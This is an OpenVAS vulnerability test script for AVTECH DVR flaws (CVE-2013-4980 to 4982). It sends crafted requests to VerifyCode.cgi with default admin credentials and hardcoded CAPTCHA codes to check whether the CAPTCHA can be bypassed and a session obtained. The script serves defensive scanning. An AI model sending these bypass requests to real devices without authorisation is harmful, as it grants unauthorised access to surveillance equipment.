###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_avtech_dvr_multiple_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# AVTECH DVR Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803768");
  script_version("$Revision: 11401 $");
  script_cve_id("CVE-2013-4980", "CVE-2013-4981", "CVE-2013-4982");
  script_bugtraq_id(62035, 62037, 62033);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-10-07 16:31:24 +0530 (Mon, 07 Oct 2013)");
  script_name("AVTECH DVR Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is running AVTECH DVR and is prone to multiple vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send crafted HTTP GET request and check it is possible bypass the captcha
verification or not.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");
  script_tag(name:"insight", value:"Multiple flaws are due to,

  - The device sending 10 hardcoded CAPTCHA requests after an initial
   purposefully false CAPTCHA request.

  - An user-supplied input is not properly validated when handling RTSP
   transactions.

  - An user-supplied input is not properly validated when handling input
   passed via the 'Network.SMTP.Receivers' parameter to the
   /cgi-bin/user/Config.cgi script.");
  script_tag(name:"affected", value:"DVR 4CH H.264 (AVTECH AVN801) firmware 1017-1003-1009-1003");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to bypass CAPTCHA
requests, cause a buffer overflow resulting in a denial of service or
potentially allowing the execution of arbitrary code.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/27942");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2013/Aug/284");
  script_xref(name:"URL", value:"http://www.coresecurity.com/advisories/avtech-dvr-multiple-vulnerabilities");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Avtech/banner");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");

dvrPort = get_http_port(default:80);
banner = get_http_banner(port:dvrPort);
if(!banner || banner !~ "Server:.*Avtech"){
  exit(0);
}

host = http_host_name(port:dvrPort);

req = 'GET //cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4' +
      '=&captcha_code=FMUA&verify_code=FMUYyLOivRpgc HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n\r\n';

result = http_send_recv(port:dvrPort, data:req);
if("ERROR: Verify Code is incorrect" >< result)
{

 req = 'GET //cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4' +
       '=&captcha_code=FMUF&verify_code=FMUYyLOivRpgc HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n\r\n';
 result = http_send_recv(port:dvrPort, data:req);

 if("0 OK" >< result &&  result =~ "Set-Cookie: SSID.*path" &&
    "ERROR: Verify Code is incorrect" >!< result)
 {
   security_message(port:dvrPort);
   exit(0);
 }
}
